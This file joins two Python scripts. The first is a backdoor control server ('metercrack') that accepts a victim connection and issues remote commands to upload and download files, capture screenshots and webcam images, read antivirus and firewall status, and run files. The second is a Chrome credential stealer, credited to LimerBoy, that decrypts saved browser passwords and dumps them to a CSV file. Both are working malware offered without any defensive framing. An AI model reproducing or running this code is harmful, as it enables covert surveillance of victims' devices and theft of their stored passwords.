from colorama import Style, Fore, init
import socket
import base64
import simplejson
import io
from PIL import Image


init(autoreset=True)
class ControlServer:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print(f"{Fore.GREEN}Listening...: {Style.RESET_ALL} {ip}:{port}")
        (self.my_connection, my_address) = my_listener.accept()
        print(f"{Fore.CYAN}Connection OK from:{Style.RESET_ALL} {str(my_address)}")

    def show_help(self):
        help_text = """
        Available Commands:
        - upload [file_path]         : Upload a file to the client.
        - download [file_path]       : Download a file from the client.
        - screenshot                 : Take a screenshot from the client's screen.
        - sysinfo                    : Get system information from the client.
        - securityinfo               : Get security (firewall and antivirus) information from the client.
        - camshot                    : Take a camera shot from the client's webcam.
        - notify [title] [message]   : Send a notification to the client.
        - run [file_path]            : Run a file/script located at the given file path on the client device.
        - quit                       : Close the connection.
        - help                       : Show this help menu.
        """
        print(help_text)

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.my_connection.close()
            exit()

        return self.json_receive()

    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "[*] OK"

    def get_file_content(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())

    def start_listener(self):
        while True:
            command_input = input("metercrack > ")
            if command_input.lower() == "help":
                self.show_help()
                continue
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1], command_output)
                elif command_input[0] == "screenshot" and "Error!" not in command_output:
                    command_output = self.save_file("source/backdoorSim.png", command_output)
                elif command_input[0] == "notify":
                    self.command_execution(command_input)
                    print("Notification command sent.")
                elif command_input[0] == "sysinfo":
                    system_info = command_output
                    for key, value in system_info.items():
                        print(f"{key}: {value}")
                elif command_input[0] == "camshot":
                    camera_image = self.command_execution(["camshot"])
                    if not camera_image.startswith("Error"):
                        self.save_file("camera_image.png", camera_image)
                    else:
                        print(camera_image)
                elif command_input[0] == "securityinfo":
                    security_info = self.command_execution(["securityinfo"])
                    print("Firewall Info:")
                    for item in security_info["Firewall"]:
                        print(f"- {item['Name']}: {'Enabled' if item['State'] else 'Disabled'}")
                    print("Antivirus Info:")
                    for item in security_info["Antivirus"]:
                        print(f"- {item['Name']}: {item['State']}")
                elif command_input[0] == "run":
                    command_output = self.command_execution(command_input)
                    print(command_output)
            except Exception:
                command_output = "Error"
            print(command_output)


controlserver = ControlServer("0.0.0.0", 8080)
controlserver.start_listener()
#Full Credits to LimerBoy
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

#GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
if __name__ == '__main__':
    try:
        #Create Dataframe to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
            	#(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url!="" and username!="" and ciphertext!=""):
                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
                            #(4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print("Sequence: %d"%(index))
                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                            print("*"*50)
                            #(5) Save into CSV 
                            csv_writer.writerow([index,url,username,decrypted_password])
                    #Close database connection
                    cursor.close()
                    conn.close()
                    #Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s"%str(e))